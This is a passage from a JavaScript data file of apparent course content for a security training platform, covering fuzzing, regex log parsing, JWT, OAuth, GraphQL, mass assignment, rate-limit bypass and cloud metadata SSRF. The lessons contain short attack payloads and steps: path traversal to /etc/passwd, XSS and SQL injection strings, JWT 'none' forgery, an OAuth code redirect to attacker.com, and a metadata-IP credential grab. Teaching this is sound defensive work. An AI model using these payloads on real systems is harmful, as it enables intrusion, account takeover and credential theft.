    print(f"Fuzzing with {len(string)} bytes")
    # Send string...
\`\`\`
                        `
                    }
                ]
            },
            {
                id: 'py-m6',
                title: 'Log Analysis Automation',
                duration: '40m',
                lessons: [
                    {
                        id: 'regex-for-hackers',
                        title: 'Regex for Hackers',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Regular Expressions (Regex)

The superpower for finding needles in haystacks.

## Cheat Sheet
- \`.\` : Any character
- \`\\d\` : Digit (0-9)
- \`\\w\` : Word char (a-z, 0-9)
- \`[abc]\` : Only a, b, or c
- \`*\` : Zero or more
- \`+\` : One or more

## Common Patterns
**IP Address:**
\`^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$\`

**Email:**
\`[\\w\\.-]+@[\\w\\.-]+\`
                        `
                    },
                    {
                        id: 'log-parser',
                        title: 'Parsing Access Logs',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Apache/Nginx Log Parser

Find all IP addresses that tried to access "/admin".

\`\`\`python
import re

log_file = open("access.log", "r")
regex = r"(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}).*GET /admin"

for line in log_file:
    match = re.search(regex, line)
    if match:
        print(f"Suspicious IP: {match.group(1)}")
\`\`\`
                        `
                    }
                ]
            },
            {
                id: 'py-m7',
                title: 'Advanced Fuzzing',
                duration: '35m',
                lessons: [
                    {
                        id: 'smart-fuzzing',
                        title: 'Smart Fuzzing',
                        type: 'text',
                        duration: '35m',
                        xp: 125,
                        content: `
# Dumb vs Smart Fuzzing

- **Dumb**: Random bytes.
- **Smart**: Aware of protocol structure (JSON, HTTP).

## Dictionary Fuzzing
Instead of random characters, use a list of known "bad" strings:
- ../../../etc/passwd (Path Traversal)
- <script>alert(1)</script> (XSS)
- ' OR 1=1-- (SQLi)

## Mutation Fuzzing
Take valid input "cat" and mutate it:
- cat'
- ca%00t
- cAt
                        `
                    }
                ]
            }
        ]
    },
    {
        id: 'api-security-testing',
        title: 'API Security Testing',
        description: 'Master REST API testing, authentication bypass, and API-specific vulnerabilities.',
        icon: Database,
        level: 'Intermediate',
        duration: '5h 15m',
        xp: 1800,
        modules: [
            {
                id: 'api-m1',
                title: 'API Fundamentals',
                duration: '60m',
                lessons: [
                    {
                        id: 'rest-api-basics',
                        title: 'Understanding REST APIs',
                        type: 'text',
                        duration: '30m',
                        xp: 100,
                        content: `
# REST API Fundamentals

## What is an API?

Application Programming Interface - allows software to communicate.

## HTTP Methods

- **GET** - Retrieve data
- **POST** - Create data
- **PUT** - Update data (full replace)
- **PATCH** - Update data (partial)
- **DELETE** - Delete data

## Status Codes

**2xx Success:**
- 200 OK
- 201 Created
- 204 No Content

**3xx Redirection:**
- 301 Moved Permanently
- 302 Found
- 304 Not Modified

**4xx Client Error:**
- 400 Bad Request
- 401 Unauthorized
- 403 Forbidden
- 404 Not Found

**5xx Server Error:**
- 500 Internal Server Error
- 502 Bad Gateway
- 503 Service Unavailable

## Common API Formats

**JSON:**
\`\`\`json
{
  "user": {
    "id": 123,
    "name": "John",
    "email": "john@example.com"
  }
}
\`\`\`

**XML:**
\`\`\`xml
<user>
  <id>123</id>
  <name>John</name>
  <email>john@example.com</email>
</user>
\`\`\`

## Authentication Methods

1. **API Keys** - Static tokens
2. **JWT** - JSON Web Tokens
3. **OAuth** - Delegated authorization
4. **Basic Auth** - Username:password encoded
5. **Bearer Tokens** - Token in Authorization header
                        `
                    },
                    {
                        id: 'api-testing-tools',
                        title: 'API Testing Tools',
                        type: 'text',
                        duration: '30m',
                        xp: 100,
                        content: `
# API Testing Tools

## Postman

**Features:**
- GUI for API testing
- Collections for organizing requests
- Environment variables
- Automated testing scripts

**Basic Request:**
1. Create new request
2. Set method (GET, POST, etc.)
3. Enter URL
4. Add headers/body
5. Click Send

## cURL

Command-line HTTP client

**GET Request:**
\`\`\`bash
curl https://api.example.com/users
\`\`\`

**POST Request:**
\`\`\`bash
curl -X POST https://api.example.com/users \\
  -H "Content-Type: application/json" \\
  -d '{"name":"John","email":"john@example.com"}'
\`\`\`

**With Authentication:**
\`\`\`bash
curl -H "Authorization: Bearer TOKEN" https://api.example.com/profile
\`\`\`

**Save Output:**
\`\`\`bash
curl https://api.example.com/data -o output.json
\`\`\`

## Burp Suite

- Intercept API requests
- Modify requests on-the-fly
- Automated scanning
- Repeater for manual testing

## HTTPie

User-friendly alternative to cURL

\`\`\`bash
http GET https://api.example.com/users
http POST https://api.example.com/users name=John email=john@test.com
\`\`\`
                        `
                    }
                ]
            },
            {
                id: 'api-m2',
                title: 'JWT Attacks',
                duration: '45m',
                lessons: [
                    {
                        id: 'jwt-structure',
                        title: 'JWT Anatomy',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# JSON Web Tokens (JWT)

A stateless way to handle authentication.

## Structure
\`Header.Payload.Signature\`

1. **Header**: Algorithm used (HS256).
2. **Payload**: User data (sub: 123, role: admin).
3. **Signature**: Hash of Header+Payload+Secret.

## Decoding
Use **jwt.io** or \`base64\` decoding. The payload is just base64 encoded, not encrypted! Anyone can read it.
                        `
                    },
                    {
                        id: 'jwt-none-alg',
                        title: 'The "None" Algorithm',
                        type: 'text',
                        duration: '25m',
                        xp: 125,
                        content: `
# Breaking signatures

## The 'None' Attack
Some libraries allow you to set the algorithm to "none".
1. Decode the token.
2. Change header alg to "None".
3. Change payload \`"role": "admin"\`.
4. Remove the signature.
5. Send it back.

## Brute Forcing Secrets
If the secret key is weak (e.g. "secret123"), you can crack it offline using **hashcat** or **jwt_tool**.
                        `
                    }
                ]
            },
            {
                id: 'api-m3',
                title: 'OAuth 2.0 Vulnerabilities',
                duration: '60m',
                lessons: [
                    {
                        id: 'oauth-flow',
                        title: 'OAuth Basics',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# OAuth 2.0

"Login with Google/Facebook".

## Roles
- **Resource Owner**: You.
- **Client**: The app (Bugora).
- **Authorization Server**: Google.
- **Resource Server**: Google Photos API.

## The Flaw
The redirect! After you login at Google, it redirects you back to the app with a \`code\`.
                        `
                    },
                    {
                        id: 'oauth-attacks',
                        title: 'Stealing the Code',
                        type: 'text',
                        duration: '40m',
                        xp: 125,
                        content: `
# Common Attacks

## Account Takeover via Redirect URI
If the app allows **wildcard subdomains** in redirect_uri:
1. Attacker sends link: \`google.com/auth?redirect_uri=attacker.com\`.
2. Victim logs in.
3. Google sends the code to \`attacker.com\`.
4. Attacker uses code to login as Victim.

## CSRF
If the app doesn't check the \`state\` parameter, you can force a victim to link *your* Google account to *their* profile.
                        `
                    }
                ]
            },
            {
                id: 'api-m4',
                title: 'GraphQL Security',
                duration: '45m',
                lessons: [
                    {
                        id: 'graphql-intro',
                        title: 'GraphQL vs REST',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# The New Kid

RPC style. One endpoint (\`/graphql\`). You ask exactly for what you want.

## Vulnerability: Introspection
By default, GraphQL tells you its entire schema.
\`\`\`graphql
{
  __schema {
    types {
      name
    }
  }
}
\`\`\`
Use this to find hidden objects like \`Users\`, \`Invoices\`, or \`AdminKeys\`.
                        `
                    },
                    {
                        id: 'recursion-attack',
                        title: 'DoS via Recursion',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# Denial of Service

GraphQL allows nested queries.

\`\`\`graphql
{
  author {
    posts {
      author {
        posts {
          author {
            ...
          }
        }
      }
    }
  }
}
\`\`\`

If not limited, this loop crashes the server.
                        `
                    }
                ]
            },
            {
                id: 'api-m5',
                title: 'Mass Assignment & IDOR',
                duration: '40m',
                lessons: [
                    {
                        id: 'mass-assignment',
                        title: 'Mass Assignment',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Auto-Binding Dangers

Frameworks often bind JSON directly to Database objects.

## The Attack
User registration form sends:
\`{"username": "user", "password": "123"}\`

Attacker sends:
\`{"username": "hacker", "password": "123", "role": "admin", "is_verified": true}\`

If the backend doesn't filter input, you become admin.
                        `
                    }
                ]
            },
            {
                id: 'api-m6',
                title: 'Rate Limiting Bypass',
                duration: '35m',
                lessons: [
                    {
                        id: 'bypass-headers',
                        title: 'Header Spoofing',
                        type: 'text',
                        duration: '35m',
                        xp: 125,
                        content: `
# Bypassing Limits

"429 Too Many Requests"

## Strategies
1. **IP Rotation**: Use a proxy mesh (AWS API Gateway).
2. **Header Spoofing**:
   Some rate limiters trust headers to identify user IP.
   - \`X-Forwarded-For: 127.0.0.1\`
   - \`X-Originating-IP: 123.123.123.123\`
   - \`Client-IP: 1.1.1.1\`
   
   Loop through random IPs in the header to bypass the block.
                        `
                    }
                ]
            },
            {
                id: 'api-m7',
                title: 'Cloud API Security',
                duration: '40m',
                lessons: [
                    {
                        id: 'cloud-metadata',
                        title: 'Cloud Metadata',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# SSRF to Cloud Keys

If you have SSRF on an AWS machine:

## The Magic IP
\`http://169.254.169.254/latest/meta-data/\`

Query this to get:
- IAM Credentials (AccessKey, SecretKey)
- Instance ID
- User Data (startup scripts)

Use these keys to access S3 buckets or control the account.
                        `
                    }
                ]
            }
        ]
    }
];
